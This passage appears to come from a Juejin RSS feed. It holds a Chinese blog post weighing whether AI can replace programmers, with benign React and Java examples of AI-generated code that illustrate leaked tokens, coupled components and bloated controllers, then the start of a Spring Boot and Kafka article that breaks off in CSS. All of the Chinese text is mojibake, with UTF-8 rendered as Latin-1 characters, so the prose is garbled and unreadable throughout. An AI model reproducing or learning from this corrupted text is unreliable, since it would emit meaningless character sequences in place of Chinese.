æ›¿ä»£ç¨‹åºå‘˜çš„å¯èƒ½æ€§è¿›è¡Œå…¨é¢åˆ†æã€‚</p>
<hr/>
<p>æ–‡ç« åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhiliaole.top%2Farchives%2F1766999092078" target="_blank" title="https://zhiliaole.top/archives/1766999092078" ref="nofollow noopener noreferrer">zhiliaole.top/archives/17â€¦</a></p>
<p>æ›´å¤šæ–‡ç« ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhiliaole.top" target="_blank" title="https://zhiliaole.top" ref="nofollow noopener noreferrer">zhiliaole.top</a></p>
<h2 data-id="heading-0">ä¸€ã€AI å¸¦æ¥çš„æ•ˆç‡æå‡</h2>
<p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œæˆ‘å‘ç° AI å¯¹ä¸€äº›é‡å¤æ€§å’Œæœºæ¢°æ€§ä»»åŠ¡éå¸¸é«˜æ•ˆï¼š</p>
<ul>
<li><strong>å‰ç«¯é¡µé¢æ¨¡æ¿</strong>ï¼šReact/Vue ç»„ä»¶å¿«é€Ÿç”Ÿæˆ</li>
<li><strong>è¡¨å•æ ¡éªŒé€»è¾‘</strong>ï¼šå¸¸è§„éªŒè¯è§„åˆ™å¯ä»¥ç›´æ¥ç”Ÿæˆ</li>
<li><strong>ç®€å• CRUD æ¥å£</strong>ï¼šåç«¯ Controller/Service ä»£ç å¿«é€Ÿè½åœ°</li>
<li><strong>å•å…ƒæµ‹è¯•å’Œæ–‡æ¡£</strong>ï¼šAI å¯ä»¥ç”ŸæˆåŸºç¡€æµ‹è¯•å’Œæ–‡æ¡£æ¨¡æ¿</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šå‰ç«¯è¡¨å•ç»„ä»¶</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [username, setUsername] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [password, setPassword] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">e</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/login'</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ username, password })
    });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSubmit}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{username}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{e</span> =&gt;</span> setUsername(e.target.value)} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{password}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{e</span> =&gt;</span> setPassword(e.target.value)} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<p>AI å¯ä»¥åœ¨å‡ ç§’é’Ÿå†…ç”Ÿæˆå¯è¿è¡Œçš„ç»„ä»¶ï¼Œå¤§å¹…èŠ‚çœå¼€å‘æ—¶é—´ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€ä¿¡æ¯å®‰å…¨æ€§ï¼šå‰åç«¯ä¸åŒåœºæ™¯çš„éšå¿§</h2>
<p>åœ¨å®è·µä¸­ï¼Œæˆ‘å‘ç° AI å¸¦æ¥çš„æ•ˆç‡èƒŒåï¼Œä¹Ÿéšè—ç€ä¿¡æ¯å®‰å…¨é£é™©ï¼š</p>
<h3 data-id="heading-2">1. å‰ç«¯é¡µé¢å¼€å‘é£é™©</h3>
<ul>
<li><strong>æ•æ„Ÿæ•°æ®æ³„éœ²</strong>ï¼šç”¨æˆ·è¡¨å•ä¿¡æ¯ï¼ˆèº«ä»½è¯ã€æ”¯ä»˜ä¿¡æ¯ï¼‰è¢«ç›´æ¥è¾“å…¥ AI æç¤ºï¼Œå¯èƒ½ä¸Šä¼ äº‘ç«¯</li>
<li><strong>API Key/Token æ³„éœ²</strong>ï¼šAI ç”Ÿæˆçš„ç¤ºä¾‹ä»£ç å¯èƒ½ç›´æ¥åŒ…å«å‡­è¯</li>
</ul>
<p><strong>ç¤ºä¾‹é£é™©ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">fetch</span>(<span class="hljs-string">'https://api.payment.com/charge?token=AI_GENERATED_KEY'</span>, {...});
</code></pre>
<ul>
<li>å¦‚æœç›´æ¥ä½¿ç”¨ AI æç¤ºç”Ÿæˆä»£ç ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</li>
</ul>
<h3 data-id="heading-3">2. åç«¯æœåŠ¡é£é™©</h3>
<ul>
<li><strong>æ ¸å¿ƒä¸šåŠ¡é€»è¾‘å¤–æ³„</strong>ï¼šé£æ§è§„åˆ™ã€æ”¯ä»˜ç­–ç•¥è¢« AI å¤„ç†æˆ–å­˜å‚¨</li>
<li><strong>ä¾èµ–æ¼æ´å¼•å…¥</strong>ï¼šAI å¯èƒ½ç›´æ¥ä½¿ç”¨ç¤ºä¾‹åº“æˆ–è¿‡æ—¶ä¾èµ–</li>
</ul>
<p><strong>ç¤ºæ„æµç¨‹å›¾ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">flowchart LR
FE<span class="hljs-selector-attr">[å‰ç«¯é¡µé¢]</span> --&gt; BE<span class="hljs-selector-attr">[åç«¯æœåŠ¡]</span>
BE --&gt; DB<span class="hljs-selector-attr">[(æ•°æ®åº“)]</span>
FE --&gt; AI<span class="hljs-selector-attr">[AIç”Ÿæˆå‰åç«¯ä»£ç ]</span>
AI --&gt; Cloud<span class="hljs-selector-attr">[äº‘ç«¯æ—¥å¿—å­˜å‚¨]</span>
Cloud --&gt; Leak<span class="hljs-selector-attr">[æ½œåœ¨ä¿¡æ¯æ³„éœ²é£é™©]</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€ç³»ç»Ÿæ¶æ„é£é™©</h2>
<p>åœ¨è¯•ç”¨ AI å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘æ³¨æ„åˆ° AI ç”Ÿæˆçš„ä»£ç å¤šå…³æ³¨å±€éƒ¨åŠŸèƒ½ï¼Œç¼ºä¹ç³»ç»Ÿçº§æ€è€ƒï¼š</p>
<h3 data-id="heading-5">1. å‰ç«¯é¡µé¢é£é™©</h3>
<ul>
<li><strong>ç»„ä»¶è€¦åˆä¸¥é‡</strong>ï¼šå¤šä¸ªé€»è¾‘æ··åœ¨ä¸€ä¸ªç»„ä»¶</li>
<li><strong>çŠ¶æ€ç®¡ç†æ··ä¹±</strong>ï¼šè·¨ç»„ä»¶å…±äº«çŠ¶æ€å¤„ç†ä¸åˆç†</li>
<li><strong>æ ·å¼é£æ ¼ä¸ç»Ÿä¸€</strong>ï¼šå½±å“ç”¨æˆ·ä½“éªŒ</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šDashboard é¡µé¢</strong></p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">Dashboard</span>() {
  const <span class="hljs-selector-attr">[user, setUser]</span> = <span class="hljs-built_in">useState</span>(null);
  <span class="hljs-built_in">fetch</span>('/api/user')<span class="hljs-selector-class">.then</span>(res =&gt; res.json())<span class="hljs-selector-class">.then</span>(data =&gt; setUser(data));

  <span class="hljs-built_in">renderChart</span>(user.stats); <span class="hljs-comment">// AIç›´æ¥åµŒå…¥å›¾è¡¨é€»è¾‘</span>

  return &lt;<span class="hljs-selector-tag">div</span>&gt;{user<span class="hljs-selector-class">.name</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;;
}
</code></pre>
<ul>
<li>æ•°æ®è¯·æ±‚å’Œå›¾è¡¨æ¸²æŸ“æ··åœ¨åŒä¸€ç»„ä»¶ï¼Œè¿èƒŒå•ä¸€èŒè´£åŸåˆ™ã€‚</li>
</ul>
<h3 data-id="heading-6">2. åç«¯æœåŠ¡é£é™©</h3>
<ul>
<li><strong>Controller å±‚ç›´æ¥åŒ…å«ä¸šåŠ¡é€»è¾‘</strong></li>
<li><strong>è·¨æ¨¡å—è°ƒç”¨</strong>ï¼šAI å¯èƒ½ç ´åå¾®æœåŠ¡è¾¹ç•Œ</li>
<li><strong>ç¼ºå°‘äº‹åŠ¡å’Œå¼‚å¸¸æ§åˆ¶</strong></li>
</ul>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/create"</span>)
public OrderResponse <span class="hljs-built_in">create</span>(<span class="hljs-variable">@RequestBody</span> OrderReq req) {
    <span class="hljs-selector-tag">orderService</span><span class="hljs-selector-class">.createAndNotify</span>(req); <span class="hljs-comment">// AIç”Ÿæˆ</span>
    <span class="hljs-selector-tag">paymentService</span><span class="hljs-selector-class">.processPayment</span>(req); <span class="hljs-comment">// AIç”Ÿæˆ</span>
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">OrderResponse</span>();
}
</code></pre>
<ul>
<li>Controller åŒæ—¶å¤„ç†è®¢å•å’Œæ”¯ä»˜ï¼Œæ¶æ„è…åŒ–é£é™©æ˜æ˜¾ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-7">å››ã€åæœŸç»´æŠ¤æ€§</h2>
<p>AI ç”Ÿæˆä»£ç è™½ç„¶å¯è¿è¡Œï¼Œä½†<strong>é•¿æœŸç»´æŠ¤é—®é¢˜çªå‡º</strong>ï¼š</p>
<h3 data-id="heading-8">å‰ç«¯é¡µé¢</h3>
<ul>
<li>çŠ¶æ€ç®¡ç†è†¨èƒ€ï¼Œè·¨ç»„ä»¶çŠ¶æ€éš¾ç»´æŠ¤</li>
<li>æ ·å¼ä¸ç»„ä»¶é£æ ¼ä¸ç»Ÿä¸€</li>
<li>ä¾èµ–åº“å‡çº§å¯èƒ½å¼•å‘å…¼å®¹é—®é¢˜</li>
</ul>
<h3 data-id="heading-9">åç«¯æœåŠ¡</h3>
<ul>
<li>åˆ†æ”¯é€»è¾‘è†¨èƒ€ï¼Œæ–°å¢ä¸šåŠ¡ç±»å‹ä¿®æ”¹æˆæœ¬é«˜</li>
<li>ç¼ºå°‘è®¾è®¡æ„å›¾å’Œä¸Šä¸‹æ–‡</li>
<li>æŠ€æœ¯å€ºç´¯ç§¯ï¼Œé•¿æœŸé‡æ„æˆæœ¬é«˜</li>
</ul>
<p><strong>ç»´æŠ¤æµç¨‹ç¤ºæ„å›¾</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">flowchart <span class="hljs-selector-tag">TD</span>
AI<span class="hljs-selector-attr">[ç”Ÿæˆä»£ç ]</span> --&gt; Review<span class="hljs-selector-attr">[äººå·¥å®¡æŸ¥]</span>
Review --&gt; Repo<span class="hljs-selector-attr">[æäº¤ä»“åº“]</span>
Repo --&gt; CI<span class="hljs-selector-attr">[è‡ªåŠ¨åŒ–æµ‹è¯•]</span>
CI --&gt; Deploy<span class="hljs-selector-attr">[ä¸Šçº¿]</span>
Deploy --&gt; Maintenance<span class="hljs-selector-attr">[åæœŸç»´æŠ¤]</span>
Maintenance --&gt; Complexity<span class="hljs-selector-attr">[ç†è§£æˆæœ¬å¢åŠ ]</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">äº”ã€å‰ç«¯é¡µé¢å¼€å‘å¯æ›¿ä»£æ€§åˆ†æ</h2>
<p>åœ¨æˆ‘çš„å®è·µä¸­ï¼ŒAI å¯¹å‰ç«¯é¡µé¢å¼€å‘çš„æ›¿ä»£æ€§è¡¨ç°å¦‚ä¸‹ï¼š</p>



































<table><thead><tr><th>å‰ç«¯ä»»åŠ¡</th><th>AI å¯æ›¿ä»£æ€§</th><th>é£é™©/é™åˆ¶</th></tr></thead><tbody><tr><td>é¡µé¢æ¨¡æ¿ç”Ÿæˆ</td><td>é«˜</td><td>éœ€äººå·¥å®¡æŸ¥å¸ƒå±€æ˜¯å¦ç¬¦åˆè®¾è®¡è§„èŒƒ</td></tr><tr><td>ç»„ä»¶åŸºç¡€é€»è¾‘</td><td>ä¸­</td><td>å¤æ‚äº¤äº’å’ŒçŠ¶æ€ç®¡ç†å¯èƒ½å‡ºé”™</td></tr><tr><td>çŠ¶æ€ç®¡ç†</td><td>ä½</td><td>è·¨ç»„ä»¶çŠ¶æ€éš¾ä»¥ç»´æŠ¤</td></tr><tr><td>æ ·å¼ä¸ UX</td><td>ä½</td><td>é£æ ¼ä¸ä¸€è‡´ï¼Œç”¨æˆ·ä½“éªŒä¸ä¿è¯</td></tr><tr><td>API è°ƒç”¨ä¸å®‰å…¨</td><td>ä¸­</td><td>éœ€äººå·¥æ£€æŸ¥æ•æ„Ÿä¿¡æ¯</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-11">å…­ã€åç«¯æœåŠ¡å¼€å‘å¯æ›¿ä»£æ€§åˆ†æ</h2>






























<table><thead><tr><th>åç«¯ä»»åŠ¡</th><th>AI å¯æ›¿ä»£æ€§</th><th>é£é™©/é™åˆ¶</th></tr></thead><tbody><tr><td>ç®€å• CRUD</td><td>é«˜</td><td>éœ€äººå·¥å®¡æŸ¥ SQL å®‰å…¨æ€§</td></tr><tr><td>æ ¸å¿ƒä¸šåŠ¡é€»è¾‘</td><td>ä½</td><td>AI æ— æ³•ç†è§£ä¸šåŠ¡ç­–ç•¥</td></tr><tr><td>å¾®æœåŠ¡æ¶æ„</td><td>ä½</td><td>å¯èƒ½ç ´åæ¨¡å—è¾¹ç•Œ</td></tr><tr><td>å¼‚å¸¸/äº‹åŠ¡å¤„ç†</td><td>ä½</td><td>ç»´æŠ¤æˆæœ¬é«˜</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-12">ä¸ƒã€çœŸå®æ¡ˆä¾‹</h2>
<h3 data-id="heading-13">å‰ç«¯æ¡ˆä¾‹</h3>
<ul>
<li>æˆ‘ä½¿ç”¨ AI ç”Ÿæˆä¸€ä¸ªç”µå•† Dashboard é¡µé¢</li>
<li>åˆæœŸè¿è¡Œæ­£å¸¸</li>
<li>éšç€ä¸šåŠ¡å¤æ‚åº¦å¢åŠ ï¼Œç»„ä»¶è€¦åˆä¸¥é‡ï¼ŒçŠ¶æ€ç®¡ç†æ··ä¹±</li>
<li>ç»´æŠ¤æˆæœ¬å¿«é€Ÿä¸Šå‡</li>
</ul>
<h3 data-id="heading-14">åç«¯æ¡ˆä¾‹</h3>
<ul>
<li>æˆ‘ç”¨ AI ç”Ÿæˆæ”¯ä»˜æ¨¡å—å’Œè®¢å•å¤„ç†é€»è¾‘</li>
<li>åˆæœŸåŠŸèƒ½å®Œæ•´ï¼Œä½†ç¼ºä¹äº‹åŠ¡æ§åˆ¶å’Œå¼‚å¸¸å¤„ç†</li>
<li>ç³»ç»Ÿæ¶æ„å—æŸï¼Œçº¿ä¸Šé—®é¢˜éš¾ä»¥è¿½è´£</li>
</ul>
<hr/>
<h2 data-id="heading-15">å…«ã€å›¢é˜Ÿä¸èŒä¸šèƒ½åŠ›å½±å“</h2>
<p>åœ¨è¯•ç”¨ AI å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°ï¼š</p>
<ul>
<li>æˆ‘çš„è§’è‰²ä»â€œä»£ç å®ç°è€…â€è½¬å‘â€œAI åä½œè€…ã€è®¾è®¡è€…ã€ä¸šåŠ¡ç†è§£è€…â€</li>
<li>æŠ€èƒ½éœ€æ±‚ä»ç¼–ç èƒ½åŠ›è½¬å‘ç³»ç»Ÿæ¶æ„èƒ½åŠ›ã€ä¸šåŠ¡ç†è§£å’ŒæŠ€æœ¯å†³ç­–</li>
<li>AI æ— æ³•æ›¿ä»£å›¢é˜Ÿæ²Ÿé€šã€éœ€æ±‚ç†è§£å’Œè·¨éƒ¨é—¨åä½œ</li>
</ul>
<p><strong>äººæœºåä½œç¤ºæ„å›¾</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">flowchart LR
Dev<span class="hljs-selector-attr">[æˆ‘/ç¨‹åºå‘˜]</span> --&gt; Prompt<span class="hljs-selector-attr">[AIæç¤ºè¾“å…¥]</span>
Prompt --&gt; AI<span class="hljs-selector-attr">[ç”Ÿæˆå‰åç«¯ä»£ç /é¡µé¢]</span>
AI --&gt; Review<span class="hljs-selector-attr">[äººå·¥å®¡æŸ¥]</span>
Review --&gt; Repo<span class="hljs-selector-attr">[æäº¤ä»“åº“]</span>
Repo --&gt; CI<span class="hljs-selector-attr">[è‡ªåŠ¨åŒ–æµ‹è¯•]</span>
CI --&gt; Deploy<span class="hljs-selector-attr">[ä¸Šçº¿]</span>
</code></pre>
<hr/>
<h2 data-id="heading-16">ä¹ã€ç»¼åˆåˆ†æ</h2>















































<table><thead><tr><th>ç»´åº¦</th><th>å‰ç«¯é¡µé¢</th><th>åç«¯æœåŠ¡</th><th>æ›¿ä»£å¯èƒ½æ€§</th><th>é£é™©ä¸é™åˆ¶</th></tr></thead><tbody><tr><td>ä¿¡æ¯å®‰å…¨æ€§</td><td>ç”¨æˆ·éšç§ã€API Key</td><td>æ•°æ®åº“ã€ä¸šåŠ¡è§„åˆ™</td><td>ä½</td><td>æ•æ„Ÿä¿¡æ¯æ³„éœ²</td></tr><tr><td>ç³»ç»Ÿæ¶æ„</td><td>ç»„ä»¶è€¦åˆã€çŠ¶æ€ç®¡ç†</td><td>å¾®æœåŠ¡è¾¹ç•Œã€äº‹åŠ¡</td><td>æä½</td><td>æ¶æ„è…åŒ–ã€éš¾æ‰©å±•</td></tr><tr><td>åæœŸç»´æŠ¤æ€§</td><td>æ ·å¼ã€çŠ¶æ€ã€ä¾èµ–</td><td>åˆ†æ”¯é€»è¾‘ã€ä¸Šä¸‹æ–‡</td><td>ä½</td><td>æŠ€æœ¯å€ºç´¯ç§¯</td></tr><tr><td>ä¸šåŠ¡ç†è§£</td><td>ç”¨æˆ·ä½“éªŒã€äº¤äº’</td><td>æ ¸å¿ƒä¸šåŠ¡ã€æ”¯ä»˜ã€é£æ§</td><td>æä½</td><td>æ— æ³•æ›¿ä»£äººç±»å†³ç­–</td></tr><tr><td>å›¢é˜Ÿåä½œ</td><td>éœ€æ±‚æ²Ÿé€šã€UI/UXè¯„å®¡</td><td>æŠ€æœ¯å†³ç­–ã€è·¨éƒ¨é—¨</td><td>æä½</td><td>AIæ— æ³•æ›¿ä»£</td></tr></tbody></table>
<blockquote>
<p>æˆ‘çš„å®è·µç»“è®ºï¼šAI å¯ä»¥æ›¿ä»£éƒ¨åˆ†é‡å¤æ€§ä»»åŠ¡ï¼Œä½†<strong>æ— æ³•å®Œå…¨æ›¿ä»£ç¨‹åºå‘˜</strong>ï¼Œå°¤å…¶åœ¨å¤æ‚å‰ç«¯é¡µé¢å’Œåç«¯æœåŠ¡ä¸­ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-17">åã€æœ€ä½³å®è·µï¼ˆä»æˆ‘è¯•ç”¨ç»éªŒå‡ºå‘ï¼‰</h2>
<ol>
<li><strong>æ˜ç¡® AI è¾¹ç•Œ</strong>ï¼šé‡å¤ä»»åŠ¡ç”± AI å®Œæˆï¼Œæ ¸å¿ƒé€»è¾‘ç”±äººè´Ÿè´£</li>
<li><strong>å®‰å…¨ä¼˜å…ˆ</strong>ï¼šæ•æ„Ÿä¿¡æ¯å’Œä¸šåŠ¡è§„åˆ™ä½¿ç”¨ä¼ä¸šç§æœ‰æ¨¡å‹</li>
<li><strong>ä¸¥æ ¼å®¡æŸ¥</strong>ï¼šAI è¾“å‡ºä»£ç å¿…é¡»äººå·¥å®¡æŸ¥</li>
<li><strong>æ–‡æ¡£ä¸è®¾è®¡è®°å½•</strong>ï¼šä¿ç•™å†³ç­–è®°å½•ï¼Œé™ä½ç»´æŠ¤æˆæœ¬</li>
<li><strong>æŠ€èƒ½æå‡</strong>ï¼šç¨‹åºå‘˜åº”ä¸“æ³¨æ¶æ„è®¾è®¡ã€ä¸šåŠ¡ç†è§£ã€æŠ€æœ¯å†³ç­–å’Œå›¢é˜Ÿåä½œ</li>
</ol>
<hr/>
<h2 data-id="heading-18">åä¸€ã€ç»“è¯­</h2>
<p>é€šè¿‡è¯•ç”¨ AI å¼€å‘ï¼Œæˆ‘åˆ‡èº«ä½“ä¼šåˆ°ï¼š</p>
<ul>
<li>AI æé«˜äº†å¼€å‘æ•ˆç‡ï¼Œä½†æ— æ³•æ›¿ä»£æ ¸å¿ƒèƒ½åŠ›</li>
<li>AI å¯ä»¥ç”Ÿæˆå‰ç«¯é¡µé¢å’Œåç«¯æœåŠ¡ï¼Œä½†é•¿æœŸæ¶æ„å’Œç»´æŠ¤ä»éœ€ç¨‹åºå‘˜</li>
<li>æœªæ¥ï¼Œç¨‹åºå‘˜çš„æ ¸å¿ƒè§’è‰²å°†è½¬å‘â€œç³»ç»Ÿè®¾è®¡è€…ã€ä¸šåŠ¡ç†è§£è€…ã€AI åä½œä¸“å®¶â€</li>
</ul>
<blockquote>
<p>AI æ˜¯åŠ©åŠ›ï¼Œè€Œä¸æ˜¯æ›¿ä»£ï¼Œå®ƒé‡å¡‘äº†æˆ‘çš„å¼€å‘æ–¹å¼ï¼Œä¹Ÿè®©æˆ‘å¯¹ç¨‹åºå‘˜çš„æ ¸å¿ƒä»·å€¼æœ‰äº†æ›´æ¸…æ™°çš„è®¤è¯†ã€‚</p>
</blockquote>
<p>æ–‡ç« åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhiliaole.top%2Farchives%2F1766999092078" target="_blank" title="https://zhiliaole.top/archives/1766999092078" ref="nofollow noopener noreferrer">zhiliaole.top/archives/17â€¦</a></p>
<p>æ›´å¤šæ–‡ç« ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhiliaole.top" target="_blank" title="https://zhiliaole.top" ref="nofollow noopener noreferrer">zhiliaole.top</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Springbootæ•´åˆkafka(MQ)]]></title>    <link>https://juejin.cn/post/7588411503120793636</link>    <guid>https://juejin.cn/post/7588411503120793636</guid>    <pubDate>2025-12-28T13:46:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588411503120793636" data-draft-id="7588411503120777252" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Springbootæ•´åˆkafka(MQ)"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-28T13:46:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ihgry"/> <meta itemprop="url" content="https://juejin.cn/user/3210229685954718"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Springbootæ•´åˆkafka(MQ)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3210229685954718/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ihgry
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T13:46:39.000Z" title="Sun Dec 28 2025 13:46:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 